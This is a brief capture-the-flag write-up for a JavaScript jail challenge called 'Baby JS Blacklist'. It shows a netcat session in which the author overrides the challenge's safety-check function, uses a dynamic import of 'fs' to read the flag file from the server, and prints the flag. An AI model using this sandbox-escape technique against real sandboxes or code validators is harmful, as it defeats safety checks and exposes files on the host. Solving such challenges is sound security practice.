# jail/Baby JS Blacklist
`Points: 466`

### Description
```
I hate functions. I hate them so much, that I made it so that you can never call them!

Note: Solving this challenge will unlock another challenge, "JS Blacklist".

Author: SteakEnthusiast

nc 34.172.149.49 5000
```

```shell
~ % nc 34.172.149.49 5000
Enter JavaScript code (one line): this.checkSafe = () => true
[Function (anonymous)]
Enter JavaScript code (one line): import('fs').then(fs => console.log(fs.readFileSync('flag').toString()))
Promise { <pending> }
Enter JavaScript code (one line): uoftctf{b4by_j4v4scr1p7_gr3w_up_4nd_b3c4m3_4_h4ck3r}
```

ez right?